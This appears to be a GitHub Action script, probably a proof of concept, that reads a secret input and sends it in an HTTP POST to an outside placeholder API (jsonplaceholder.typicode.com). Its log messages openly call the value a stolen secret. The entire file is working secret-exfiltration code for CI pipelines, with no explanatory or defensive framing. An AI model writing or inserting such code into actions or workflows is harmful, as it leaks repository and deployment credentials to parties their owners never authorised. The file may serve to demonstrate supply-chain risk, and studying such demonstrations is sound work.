const core = require("@actions/core");
const request = require("request");

try {
  const mySecret = core.getInput("my-secret");
  console.log(`DO SOMETHING REALLY COOL WITH THE SECRET FOR YEARS`);

  console.log(`ATTEMPTING TO STORE THE SECRET VIA AN HTTP CALL`);
  request.post(
    "https://jsonplaceholder.typicode.com/posts",
    {
      json: {
        title: "store my stolen secret somewhere",
        body: mySecret,
        userId: 1
      },
      headers: { "Content-type": "application/json; charset=UTF-8" }
    },
    (error, res, body) => {
      if (error) {
        console.error(error);
        return;
      }
      console.log(`SUCCESSFULLY STORE SOMEONE SECRET`, res.statusCode, body);
    }
  );
} catch (error) {
  core.setFailed(error.message);
}
